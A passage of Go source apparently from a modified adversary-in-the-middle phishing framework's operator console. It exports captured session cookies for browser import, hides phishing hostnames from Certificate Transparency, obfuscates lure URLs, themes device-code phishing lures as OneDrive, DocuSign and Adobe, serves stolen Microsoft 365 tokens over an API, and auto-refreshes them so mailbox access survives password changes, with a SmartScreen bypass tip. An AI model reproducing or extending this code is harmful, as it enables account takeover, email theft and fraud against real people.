	t.hlp = h
}

func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		Session        bool   `json:"session"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
				Session:        false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				// c.Domain = domain[1:] - bug support no longer needed
				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func (t *Terminal) tokensToJSON(tokens map[string]string) string {
	var ret string
	white := color.New(color.FgHiWhite)
	for k, v := range tokens {
		ret += fmt.Sprintf("%s: %s\n", k, white.Sprint(v))
	}
	return ret
}

func (t *Terminal) checkStatus() {
	if t.cfg.GetBaseDomain() == "" {
		log.Warning("server domain not set! type: config domain <domain>")
	}
	if t.cfg.GetServerExternalIP() == "" {
		log.Warning("server external ip not set! type: config ipv4 external <external_ipv4_address>")
	}
}

func (t *Terminal) manageCertificates(verbose bool) {
	if !t.p.developer {
		if t.cfg.IsAutocertEnabled() {
			// Check if wildcard TLS is enabled
			if t.cfg.IsWildcardTLSEnabled() {
				wildcardDomains := t.cfg.GetWildcardDomains()
				if len(wildcardDomains) == 0 {
					log.Error("wildcard TLS enabled but no domains configured")
					return
				}

				// Check if external DNS is available for DNS-01 ACME challenge
				hasExternalDNS := false
				for _, dom := range wildcardDomains {
					baseDom := strings.TrimPrefix(dom, "*.")
					if baseDom != dom {
						continue // skip wildcard entries, check apex only
					}
					if CanUseExternalDNS(baseDom) {
						hasExternalDNS = true
						break
					}
				}

				if hasExternalDNS {
					// Use Let's Encrypt DNS-01 challenge via external DNS provider
					if verbose {
						log.Info("obtaining wildcard TLS certificates via DNS-01 challenge for %d domains - this may take up to 3 minutes...", len(wildcardDomains)/2)
						log.Info("wildcard certificates prevent phishing hostnames from being exposed in Certificate Transparency logs")
					}
					err := t.p.crt_db.setWildcardManagedSync(wildcardDomains, 180*time.Second)
					if err != nil {
						log.Error("failed to obtain wildcard TLS certificates: %s", err)
						log.Warning("falling back to self-signed wildcard certificates...")
						err = t.p.crt_db.setSelfSignedWildcardSync(wildcardDomains)
						if err != nil {
							log.Error("failed to generate self-signed wildcard certificates: %s", err)
							return
						}
					}
					if verbose {
						log.Success("successfully obtained wildcard TLS certificates")
					}
				} else {
					// No external DNS — use self-signed wildcard certificates
					if verbose {
						log.Info("generating self-signed wildcard certificates for %d domains (no external DNS provider)...", len(wildcardDomains)/2)
						log.Info("wildcard certificates prevent subdomain enumeration — browsers will show security warnings with self-signed certs")
					}
					err := t.p.crt_db.setSelfSignedWildcardSync(wildcardDomains)
					if err != nil {
						log.Error("failed to generate self-signed wildcard certificates: %s", err)
						return
					}
					if verbose {
						log.Success("successfully generated self-signed wildcard certificates")
					}
				}
			} else {
				// Standard certificate management (HTTP-01 challenge)
				// Use filtered hostnames: skip disabled federation provider subdomains
				hosts := t.p.cfg.GetActiveCertHostnames("")
				if len(hosts) == 0 {
					if verbose {
						log.Warning("no active hostnames to obtain certificates for")
					}
					return
				}

				allHosts := t.p.cfg.GetActiveHostnames("")
				skipped := len(allHosts) - len(hosts)
				if verbose {
					log.Info("obtaining TLS certificates for %d hostnames via HTTP-01 (skipped %d disabled provider hosts)", len(hosts), skipped)
				}

				// Process certificates in batches to avoid timeout and rate limit issues
				batchSize := 10
				totalSuccess := 0
				totalFailed := 0

				for i := 0; i < len(hosts); i += batchSize {
					end := i + batchSize
					if end > len(hosts) {
						end = len(hosts)
					}
					batch := hosts[i:end]
					batchNum := (i / batchSize) + 1
					totalBatches := (len(hosts) + batchSize - 1) / batchSize

					if verbose {
						log.Info("[batch %d/%d] requesting certificates for %d hosts...", batchNum, totalBatches, len(batch))
						for _, h := range batch {
							log.Info("  → %s", h)
						}
					}

					// 30 seconds per host in batch, minimum 60s per batch
					timeout := time.Duration(len(batch)*30) * time.Second
					if timeout < 60*time.Second {
						timeout = 60 * time.Second
					}

					err := t.p.crt_db.setManagedSync(batch, timeout)
					if err != nil {
						totalFailed += len(batch)
						errStr := err.Error()
						if strings.Contains(errStr, "rate limit") || strings.Contains(errStr, "too many") || strings.Contains(errStr, "rateLimited") {
							log.Error("[batch %d/%d] Let's Encrypt RATE LIMIT hit: %s", batchNum, totalBatches, err)
							log.Error("rate limit: Let's Encrypt allows 50 certificates per domain per week")
							log.Error("rate limit: wait 1 week, or use a different domain")
							log.Warning("remaining batches skipped due to rate limit")
							break
						}
						log.Error("[batch %d/%d] failed: %s", batchNum, totalBatches, err)
						log.Warning("will continue with remaining batches...")
					} else {
						totalSuccess += len(batch)
						if verbose {
							log.Success("[batch %d/%d] obtained %d certificates", batchNum, totalBatches, len(batch))
						}
					}

					// Small delay between batches to avoid hammering Let's Encrypt
					if end < len(hosts) {
						time.Sleep(2 * time.Second)
					}
				}

				if verbose {
					if totalFailed == 0 {
						log.Success("all %d TLS certificates obtained successfully", totalSuccess)
					} else {
						log.Warning("certificates: %d succeeded, %d failed", totalSuccess, totalFailed)
						log.Info("run 'phishlets enable <name>' to retry failed certificates")
					}
				}
			}
		} else {
			err := t.p.crt_db.setUnmanagedSync(verbose)
			if err != nil {
				log.Error("failed to set up TLS certificates: %s", err)
				log.Error("run 'test-certs' command to retry")
				return
			}
		}
	}
}

func (t *Terminal) sprintPhishletStatus(site string) string {
	higreen := color.New(color.FgHiGreen)
	logreen := color.New(color.FgGreen)
	hiblue := color.New(color.FgHiBlue)
	blue := color.New(color.FgBlue)
	cyan := color.New(color.FgHiCyan)
	yellow := color.New(color.FgYellow)
	higray := color.New(color.FgWhite)
	logray := color.New(color.FgHiBlack)
	magenta := color.New(color.FgMagenta)
	n := 0
	cols := []string{"phishlet", "status", "visibility", "hostname", "domain", "unauth_url"}
	var rows [][]string

	var pnames []string
	for s := range t.cfg.phishlets {
		pnames = append(pnames, s)
	}
	sort.Strings(pnames)

	for _, s := range pnames {
		pl := t.cfg.phishlets[s]
		if site == "" || s == site {
			_, err := t.cfg.GetPhishlet(s)
			if err != nil {
				continue
			}

			status := logray.Sprint("disabled")
			if pl.isTemplate {
				status = yellow.Sprint("template")
			} else if t.cfg.IsSiteEnabled(s) {
				status = higreen.Sprint("enabled")
			}
			hidden_status := higray.Sprint("visible")
			if t.cfg.IsSiteHidden(s) {
				hidden_status = logray.Sprint("hidden")
			}
			domain, _ := t.cfg.GetSiteDomain(s)
			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
			assignedDomain := t.cfg.GetSiteAssignedDomain(s)
			n += 1

			if s == site {
				var param_names string
				for k, v := range pl.customParams {
					if len(param_names) > 0 {
						param_names += "; "
					}
					param_names += k
					if v != "" {
						param_names += ": " + v
					}
				}

				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "domain", "unauth_url", "params"}
				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), magenta.Sprint(assignedDomain), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
				return AsRows(keys, vals)
			} else if site == "" {
				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), magenta.Sprint(assignedDomain), logreen.Sprint(unauth_url)})
			}
		}
	}
	return AsTable(cols, rows)
}

func (t *Terminal) sprintIsEnabled(enabled bool) string {
	logray := color.New(color.FgHiBlack)
	normal := color.New(color.Reset)

	if enabled {
		return normal.Sprint("true")
	} else {
		return logray.Sprint("false")
	}
}

func (t *Terminal) sprintLures() string {
	higreen := color.New(color.FgHiGreen)
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	cyan := color.New(color.FgCyan)
	hcyan := color.New(color.FgHiCyan)
	white := color.New(color.FgHiWhite)
	magenta := color.New(color.FgMagenta)
	//n := 0
	cols := []string{"id", "phishlet", "hostname", "domain", "path", "redirector", "redirect_url", "paused", "og", "dc_mode", "dc_theme"}
	var rows [][]string
	for n, l := range t.cfg.lures {
		var og string
		if l.OgTitle != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgDescription != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgImageUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}

		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

		// Show effective domain (lure override > phishlet domain > base domain)
		effectiveDomain, _ := t.cfg.GetLureDomain(n)
		domainStr := magenta.Sprint(effectiveDomain)
		if l.Domain != "" {
			domainStr = magenta.Sprint(l.Domain + " (override)")
		}

		// Device code mode display
		dcMode := l.DeviceCodeMode
		if dcMode == "" {
			dcMode = "always"
		}
		var dcStr string
		switch dcMode {
		case DCModeAlways:
			dcStr = higreen.Sprint(dcMode)
		case DCModeFallback:
			dcStr = yellow.Sprint(dcMode)
		case DCModeAuto:
			dcStr = hcyan.Sprint(dcMode)
		case DCModeDirect:
			dcStr = higreen.Sprint(dcMode)
		default:
			dcStr = "-"
		}

		// Device code theme display
		dcTheme := l.DeviceCodeTheme
		if dcTheme == "" {
			dcTheme = "-"
		}
		var dcThemeStr string
		switch dcTheme {
		case "onedrive":
			dcThemeStr = hiblue.Sprint(dcTheme)
		case "authenticator":
			dcThemeStr = hcyan.Sprint(dcTheme)
		case "adobe":
			dcThemeStr = color.New(color.FgHiRed).Sprint(dcTheme)
		case "docusign":
			dcThemeStr = yellow.Sprint(dcTheme)
		case "sharepoint":
			dcThemeStr = higreen.Sprint(dcTheme)
		default:
			dcThemeStr = "-"
		}

		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), domainStr, hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), s_paused, og, dcStr, dcThemeStr})
	}
	return AsTable(cols, rows)
}

func (t *Terminal) phishletPrefixCompleter(args string) []string {
	return t.cfg.GetPhishletNames()
}

func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
	dir := t.cfg.GetRedirectorsDir()

	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return []string{}
	}
	var ret []string
	for _, f := range files {
		if f.IsDir() {
			index_path1 := filepath.Join(dir, f.Name(), "index.html")
			index_path2 := filepath.Join(dir, f.Name(), "index.htm")
			index_found := ""
			if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
				index_found = index_path1
			} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
				index_found = index_path2
			}
			if index_found != "" {
				name := f.Name()
				if strings.Contains(name, " ") {
					name = "\"" + name + "\""
				}
				ret = append(ret, name)
			}
		}
	}
	return ret
}

func (t *Terminal) luresIdPrefixCompleter(args string) []string {
	var ret []string
	for n := range t.cfg.lures {
		ret = append(ret, strconv.Itoa(n))
	}
	return ret
}

func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
	var ret []string
	var ret_params []map[string]string

	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		return ret, ret_params, err
	}
	defer f.Close()

	var format string = "text"
	if filepath.Ext(path) == ".csv" {
		format = "csv"
	} else if filepath.Ext(path) == ".json" {
		format = "json"
	}

	log.Info("importing parameters file as: %s", format)

	switch format {
	case "text":
		fs := bufio.NewScanner(f)
		fs.Split(bufio.ScanLines)

		n := 0
		for fs.Scan() {
			n += 1
			l := fs.Text()
			// remove comments
			if n := strings.Index(l, ";"); n > -1 {
				l = l[:n]
			}
			l = strings.Trim(l, " ")

			if len(l) > 0 {
				args, err := parser.Parse(l)
				if err != nil {
					log.Error("syntax error at line %d: [%s] %v", n, l, err)
					continue
				}

				params := url.Values{}
				map_params := make(map[string]string)
				for _, val := range args {
					sp := strings.Index(val, "=")
					if sp == -1 {
						log.Error("invalid parameter syntax at line %d: [%s]", n, val)
						continue
					}
					k := val[:sp]
					v := val[sp+1:]

					params.Add(k, v)
					map_params[k] = v
				}

				if len(params) > 0 {
					ret = append(ret, t.createPhishUrl(base_url, &params))
					ret_params = append(ret_params, map_params)
				}
			}
		}
	case "csv":
		r := csv.NewReader(bufio.NewReader(f))

		param_names, err := r.Read()
		if err != nil {
			return ret, ret_params, err
		}

		var params []string
		for params, err = r.Read(); err == nil; params, err = r.Read() {
			if len(params) != len(param_names) {
				log.Error("number of csv values do not match number of keys: %v", params)
				continue
			}

			item := url.Values{}
			map_params := make(map[string]string)
			for n, param := range params {
				item.Add(param_names[n], param)
				map_params[param_names[n]] = param
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}
		if err != io.EOF {
			return ret, ret_params, err
		}
	case "json":
		data, err := ioutil.ReadAll(bufio.NewReader(f))
		if err != nil {
			return ret, ret_params, err
		}

		var params_json []map[string]interface{}

		err = json.Unmarshal(data, &params_json)
		if err != nil {
			return ret, ret_params, err
		}

		for _, json_params := range params_json {
			item := url.Values{}
			map_params := make(map[string]string)
			for k, v := range json_params {
				if val, ok := v.(string); ok {
					item.Add(k, val)
					map_params[k] = val
				} else {
					log.Error("json parameter '%s' value must be of type string", k)
				}
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}

		/*
			r := json.NewDecoder(bufio.NewReader(f))

			t, err := r.Token()
			if err != nil {
				return ret, ret_params, err
			}
			if s, ok := t.(string); ok && s == "[" {
				for r.More() {
					t, err := r.Token()
					if err != nil {
						return ret, ret_params, err
					}

					if s, ok := t.(string); ok && s == "{" {
						for r.More() {
							t, err := r.Token()
							if err != nil {
								return ret, ret_params, err
							}


						}
					}
				}
			} else {
				return ret, ret_params, fmt.Errorf("array of parameters not found")
			}*/
	}
	return ret, ret_params, nil
}

func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phish_params []map[string]string, format string) error {
	if len(phish_urls) != len(phish_params) {
		return fmt.Errorf("phishing urls and phishing parameters count do not match")
	}
	if !stringExists(format, []string{"text", "csv", "json"}) {
		return fmt.Errorf("export format can only be 'text', 'csv' or 'json'")
	}

	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if format == "text" {
		for n, phish_url := range phish_urls {
			var params string
			m := 0
			params_row := phish_params[n]
			for k, v := range params_row {
				if m > 0 {
					params += " "
				}
				params += fmt.Sprintf("%s=\"%s\"", k, v)
				m += 1
			}

			_, err := f.WriteString(phish_url + " ; " + params + "\n")
			if err != nil {
				return err
			}
		}
	} else if format == "csv" {
		var data [][]string

		w := csv.NewWriter(bufio.NewWriter(f))

		var cols []string
		var param_names []string
		cols = append(cols, "url")
		for _, params_row := range phish_params {
			for k := range params_row {
				if !stringExists(k, param_names) {
					cols = append(cols, k)
					param_names = append(param_names, k)
				}
			}
		}
		data = append(data, cols)

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			var vals []string
			vals = append(vals, phish_url)

			for _, k := range param_names {
				vals = append(vals, params[k])
			}

			data = append(data, vals)
		}

		err := w.WriteAll(data)
		if err != nil {
			return err
		}
	} else if format == "json" {
		type UrlItem struct {
			PhishUrl string            `json:"url"`
			Params   map[string]string `json:"params"`
		}

		var items []UrlItem

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			item := UrlItem{
				PhishUrl: phish_url,
				Params:   params,
			}

			items = append(items, item)
		}

		data, err := json.MarshalIndent(items, "", "\t")
		if err != nil {
			return err
		}

		_, err = f.WriteString(string(data))
		if err != nil {
			return err
		}
	}

	return nil
}

func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
	var ret string = base_url
	if len(*params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))

		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}

func (t *Terminal) sprintVar(k string, v string) string {
	vc := color.New(color.FgYellow)
	return k + ": " + vc.Sprint(v)
}

func (t *Terminal) handleFeed(args []string) {
	feed := t.p.tokenFeed
	if feed == nil {
		log.Error("Token feed not initialized")
		return
	}

	if len(args) == 0 {
		// Show feed status and URL
		apiKey := feed.GetAPIKey()
		phishDomain := t.cfg.GetBaseDomain()
		if phishDomain == "" {
			phishDomain = "<your-domain>"
		}

		log.Info("[feed] Token Feed API Status")
		log.Info("[feed] ─────────────────────────────")
		log.Info("[feed] API Key: %s", apiKey)
		log.Info("[feed] Endpoint: https://%s/api/v1/feed?key=%s", phishDomain, apiKey)
		log.Info("")
		log.Info("[feed] Mailbox Viewer Setup:")
		log.Info("[feed]   1. Open mailbox.html in browser")
		log.Info("[feed]   2. The feed URL is configured in the settings")
		log.Info("[feed]   3. Accounts auto-sync every 30 seconds")

		// Show accounts that would be served
		accounts, err := feed.GetAccounts()
		if err != nil {
			log.Error("[feed] Error: %v", err)
			return
		}
		log.Info("[feed]")
		log.Info("[feed] Accounts with tokens: %d", len(accounts))
		for _, acc := range accounts {
			log.Info("[feed]   [%d] %s (%s) - %s", acc.SessionID, acc.Email, acc.DisplayName, acc.Status)
		}
		return
	}

	switch args[0] {
	case "key":
		log.Info("[feed] API Key: %s", feed.GetAPIKey())
	case "url":
		phishDomain := t.cfg.GetBaseDomain()
		if phishDomain == "" {
			phishDomain = "<your-domain>"
		}
		log.Info("[feed] Feed URL: https://%s/api/v1/feed?key=%s", phishDomain, feed.GetAPIKey())
	default:
		log.Info("[feed] Usage:")
		log.Info("[feed]   feed        - Show feed status and accounts")
		log.Info("[feed]   feed key    - Show API key")
		log.Info("[feed]   feed url    - Show full feed URL")
	}
}

func (t *Terminal) handleMailbox(args []string) {
	mailbox := t.p.mailboxAccounts
	if mailbox == nil {
		log.Error("Mailbox accounts manager not initialized")
		return
	}

	if len(args) == 0 {
		// Show mailbox status and accounts
		total, active, expired, admins := mailbox.GetStats()
		phishDomain := t.cfg.GetBaseDomain()
		if phishDomain == "" {
			phishDomain = "<your-domain>"
		}
		apiKey := t.p.tokenFeed.GetAPIKey()

		log.Info("[mailbox] Persistent Mailbox Accounts")
		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
		log.Info("[mailbox] Total:   %d accounts", total)
		log.Info("[mailbox] Active:  %d accounts (tokens valid)", active)
		log.Info("[mailbox] Expired: %d accounts (need manual refresh)", expired)
		log.Info("[mailbox] Admins:  %d accounts (with admin roles)", admins)
		log.Info("[mailbox]")
		log.Info("[mailbox] API Endpoint: https://%s/api/v1/mailbox?key=%s", phishDomain, apiKey)
		log.Info("[mailbox] Storage: %s/mailbox_accounts.json", t.cfg.GetDataDir())
		log.Info("[mailbox]")

		// Show all accounts
		accounts := mailbox.ListAccounts()
		if len(accounts) > 0 {
			log.Info("[mailbox] Accounts:")
			for _, acc := range accounts {
				adminFlag := ""
				if acc.IsAdmin {
					adminFlag = " [ADMIN]"
				}
				refreshInfo := ""
				if acc.RefreshCount > 0 {
					refreshInfo = fmt.Sprintf(" (refreshed %dx)", acc.RefreshCount)
				}
				log.Info("[mailbox]   [%s] %s (%s) - %s%s%s", acc.ID, acc.Email, acc.DisplayName, acc.Status, adminFlag, refreshInfo)
				if acc.LastError != "" {
					log.Warning("[mailbox]        └─ Error: %s", acc.LastError)
				}
			}
		} else {
			log.Info("[mailbox] No accounts saved yet. Accounts will be auto-added when device code tokens are captured.")
		}
		log.Info("[mailbox]")
		log.Info("[mailbox] Accounts survive password changes as long as tokens are refreshed.")
		log.Info("[mailbox] Auto-refresh runs every 10 minutes for all accounts with refresh tokens.")
		return
	}

	switch args[0] {
	case "refresh":
		if len(args) < 2 {
			log.Info("[mailbox] Usage: mailbox refresh <account-id>")
			log.Info("[mailbox]        mailbox refresh all")
			return
		}
		if args[1] == "all" {
			log.Info("[mailbox] Refreshing all accounts...")
			accounts := mailbox.ListAccounts()
			for _, acc := range accounts {
				if err := mailbox.ManualRefresh(acc.ID); err != nil {
					log.Warning("[mailbox] Failed to refresh %s: %v", acc.Email, err)
				} else {
					log.Success("[mailbox] Refreshed %s", acc.Email)
				}
			}
		} else {
			if err := mailbox.ManualRefresh(args[1]); err != nil {
				log.Error("[mailbox] Failed to refresh: %v", err)
			} else {
				log.Success("[mailbox] Token refreshed")
			}
		}
	case "remove", "delete":
		if len(args) < 2 {
			log.Info("[mailbox] Usage: mailbox remove <account-id>")
			return
		}
		acc := mailbox.GetAccount(args[1])
		if acc == nil {
			log.Error("[mailbox] Account not found: %s", args[1])
			return
		}
		if err := mailbox.RemoveAccount(args[1]); err != nil {
			log.Error("[mailbox] Failed to remove account: %v", err)
		} else {
			log.Success("[mailbox] Removed account: %s", acc.Email)
		}
	case "url":
		apiHost := t.getAPIHost()
		apiKey := t.p.tokenFeed.GetAPIKey()
		log.Info("[mailbox] API URL: https://%s/api/v1/mailbox?key=%s", apiHost, apiKey)
	case "download":
		apiHost := t.getAPIHost()
		if apiHost == "<your-domain>" {
			log.Error("[mailbox] Please configure your domain and enable a phishlet first")
			return
		}
		apiKey := t.p.tokenFeed.GetAPIKey()
		downloadURL := fmt.Sprintf("https://%s/api/v1/mailbox/download?key=%s", apiHost, apiKey)
		jsonURL := fmt.Sprintf("https://%s/api/v1/mailbox?key=%s&action=export", apiHost, apiKey)
		protoURL := fmt.Sprintf("m365mail://import?key=%s&server=%s", apiKey, apiHost)
		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
		log.Info("[mailbox] M365-Mail Download Package")
		log.Info("[mailbox] ════════════════════════════════════════════════════════════")
		log.Info("[mailbox]")
		log.Info("[mailbox] \u25ba ONE-CLICK IMPORT (open in browser on target PC):")
		log.Success("[mailbox]   %s", protoURL)
		log.Info("[mailbox]   Opens M365-Mail.exe and imports all accounts automatically")
		log.Info("[mailbox]")
		log.Info("[mailbox] \u25ba ZIP Download (contains M365-Mail.exe + accounts-import.json):")
		log.Success("[mailbox]   %s", downloadURL)
		log.Info("[mailbox]   Run Start.bat after extracting to bypass SmartScreen")
		log.Info("[mailbox]")
		log.Info("[mailbox] \u25ba Direct JSON export:")
		log.Success("[mailbox]   %s", jsonURL)
		log.Info("[mailbox]")
		log.Info("[mailbox] Total accounts: %d", mailbox.Count())
	case "stats":
		total, active, expired, admins := mailbox.GetStats()
		log.Info("[mailbox] Statistics:")
		log.Info("[mailbox]   Total:   %d", total)
		log.Info("[mailbox]   Active:  %d", active)
		log.Info("[mailbox]   Expired: %d", expired)
		log.Info("[mailbox]   Admins:  %d", admins)
	default:
		log.Info("[mailbox] Usage:")
		log.Info("[mailbox]   mailbox               - List all saved accounts")
		log.Info("[mailbox]   mailbox refresh <id>  - Force refresh a specific account")
		log.Info("[mailbox]   mailbox refresh all   - Force refresh all accounts")
		log.Info("[mailbox]   mailbox remove <id>   - Remove an account")
		log.Info("[mailbox]   mailbox url           - Show API endpoint URL")
		log.Info("[mailbox]   mailbox download      - Show download URL for M365-Mail package")
		log.Info("[mailbox]   mailbox stats         - Show statistics")
	}
}

func (t *Terminal) filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

// getAPIHost returns the best hostname to use for API URLs.
// Prefers an active phishlet hostname (which has a valid TLS cert) over the bare base domain.
func (t *Terminal) getAPIHost() string {
	hosts := t.cfg.GetActiveHostnames("")
	if len(hosts) > 0 {
		return hosts[0]
	}
	baseDomain := t.cfg.GetBaseDomain()
	if baseDomain != "" {
		return baseDomain
	}
	return "<your-domain>"
}
